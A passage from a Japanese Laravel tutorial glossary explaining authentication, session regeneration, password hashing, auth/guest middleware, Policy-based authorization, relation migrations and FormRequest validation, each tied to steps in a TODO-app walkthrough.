([ステップ6-3](dev-walkthrough.md#ステップ6-3-github-actionsで自動化ci赤緑実験6-b))。

# 第2部・スプリント7で登場した概念

## 37. 認証とセッション

**① 一言定義**: 認証は「あなたが誰か」を確かめること。ログインが成功すると、
サーバは**セッション**(利用者ごとの一時的な記憶)に「この人はログイン済み」と
記録し、以降のリクエストをCookie経由のセッションIDで結びつける。

**② なぜ必要か**: HTTPは1回ごとに切れる(前のリクエストを覚えていない)ため、
何もしないと毎ページでログインし直すことになります。セッションが「ログイン状態」を
保持します。ただしセッションIDが盗まれると成りすまされるため、ログインの瞬間に
**セッションIDを作り直す**(`session()->regenerate()`)ことで、ログイン前に
攻撃者が用意したIDを無効化します(**セッション固定攻撃**への対策)。
ログアウトでは `invalidate()` でセッションを破棄します。
※ この段階は「認証(誰か)」まで。「誰が何を触れるか(認可)」はスプリント8。

**③ このリポジトリでの実例**: `LoginController::store()` の `auth()->attempt()` +
`session()->regenerate()`、`destroy()` の `invalidate()`
([ステップ7-1](dev-walkthrough.md#ステップ7-1-登録ログインログアウトを作る))。

## 38. パスワードハッシュ

**① 一言定義**: パスワードを**元に戻せない形**(ハッシュ)に変換して保存する仕組み。
Laravelでは `User` の `password` を `hashed` キャストにすると、代入時に自動でbcrypt
ハッシュ化される。照合は `Hash::check(平文, ハッシュ)`。

**② なぜ必要か(事故例)**: パスワードを平文で保存すると、**DBが漏洩した瞬間に
全利用者のパスワードが丸見え**になります(他サイトで使い回している人はそちらも
乗っ取られる)。ハッシュは一方向なので、漏れても元のパスワードは簡単には分かりません。
さらにbcryptは「わざと遅い」計算で総当たり攻撃を困難にします。だから照合も
`==` や `===` の平文比較ではなく、必ず `Hash::check` を使います
(実験7-Aで平文比較が必ず外れることを確認)。

**③ このリポジトリでの実例**: `User` モデルの `'password' => 'hashed'` キャスト。
DBには `$2y$12$...`(bcrypt)で保存される
([実験7-A](dev-walkthrough.md#実験7-a-パスワードはハッシュで保存されるわざと平文比較して失敗を見る))。

## 39. ミドルウェアとauth/guest

**① 一言定義**: ミドルウェアは、リクエストがコントローラに届く**前後**に挟む共通処理。
`auth` は「ログイン必須」、`guest` は「ログイン済みなら弾く」門番。

**② なぜ必要か**: 「ログインしていない人を弾く」処理を各コントローラに書くと、
書き忘れた1箇所が穴になります(認可漏れ事故)。ミドルウェアでルートを**まとめて**
守れば、守り忘れが構造的に起きにくい。`auth` は未ログインを自動で `login` という
名前のルートへ誘導し、`guest` はログイン中の人を登録・ログイン画面から追い返します
(ログイン済みなのに登録画面、という不整合を防ぐ)。

**③ このリポジトリでの実例**: `routes/web.php` の
`Route::middleware('auth')->group(...)`(TODO系を保護)と
`Route::middleware('guest')->group(...)`(登録/ログイン)。
テストでは `actingAs($user)` でこの門を通過した状態を作る
([ステップ7-2](dev-walkthrough.md#ステップ7-2-既存テストを認証前提に更新する予想の答え合わせ))。

# 第2部・スプリント8で登場した概念

## 40. 認可とPolicy

**① 一言定義**: 認可(authorization)は「ログイン済みの人が**何をしてよいか**」を
決めること。Policyは、あるモデルに対する認可ルールを1クラスに集めたもの。
コントローラで `$this->authorize('view', $todo)` と呼ぶと、falseのとき自動で**403**。

**② なぜ必要か(認証との違い)**: 認証(スプリント7)は「あなたが誰か」まで。
それだけだと**ログインさえすれば他人のデータも触れてしまう**。認可は
「この人はこのデータの持ち主か」を判定して他人のTODOを守ります。
判定を各コントローラにバラ書きすると1箇所の書き忘れが情報漏洩の穴になるため、
Policyに集約します。応答コードの使い分けも重要: **未ログイン=302(ログインへ)、
ログイン済みだが権限なし=403(Forbidden)、存在しない=404**。

**③ このリポジトリでの実例**: `app/Policies/TodoPolicy.php`(view/update/deleteが
`$user->id === $todo->user_id` を見る)。コントローラ各操作の `$this->authorize(...)`。
他人のTODOが403になること、authorizeを外すと見えてしまうことを実演
([実験8-A](dev-walkthrough.md#実験8-a-認可の効き目を確かめるそして守りを外して見る))。

## 41. リレーションと既存データの移行

**① 一言定義**: リレーションはテーブル間の関係(User has many Todo、
Todo belongs to User)。`$user->todos()` で持ち物をたどれる。
既存データの移行は、稼働中テーブルの構造変更時に既存行の面倒を見ること。

**② なぜ必要か**: 「TODOは誰のものか」を外部キー(`user_id`)で表し、
`$user->todos()->create()` のように**所有者つきで安全に作れる**ようにします。
問題は、既に12件のTODOがある状態で `user_id` を**NOT NULLで足すと既存行が
値を持てず失敗**すること。そこで**3段階**:(1)nullableで追加 →(2)既存行を
デモユーザーに紐付ける(データ移行)→(3)NOT NULL+外部キー化。これを
1マイグレーションにまとめ、途中の不完全な状態を他環境に漏らさないようにします。

**③ このリポジトリでの実例**: `add_user_id_to_todos_table` の3段階up()、
`User::todos()`(hasMany)/ `Todo::user()`(belongsTo)。既存12件がデモに紐付き、
rollbackでもデータが残ることを確認
([ステップ8-1](dev-walkthrough.md#ステップ8-1-user_idの追加とデータ移行t-16))。

## 42. FormRequestとバリデーションの集約

**① 一言定義**: FormRequestは、バリデーションルールを専用クラスに切り出す仕組み
(`make:request`)。コントローラの引数の型をそのクラスにすると、**コントローラに
入る前に検証**され、違反は自動で差し戻される。

**② なぜ必要か**: 同じルールをstoreとupdateに書くと、片方だけ直す修正漏れが起きます
(第1部では**あえて重複を残し**、その危うさを教材にした)。FormRequestに集約すれば
「ルールの置き場所は1つ」。ただし共通化は常に正義ではなく、
「storeとupdateは将来別ルールになりうる」なら**あえて別クラス**にするのも設計判断
([DRYの天秤](#29-dry))。リファクタは**テストが緑のまま**であることを確認しながら
行う(振る舞いを変えない=リファクタの定義)。

**③ このリポジトリでの実例**: `StoreTodoRequest` / `UpdateTodoRequest`。
コントローラは `store(StoreTodoRequest $request)` で受け `$request->validated()` を使う。
39テスト緑→変更→再び緑で振る舞い不変を担保
([ステップ8-3](dev-walkthrough.md#ステップ8-3-formrequestで負債を返すt-18))。
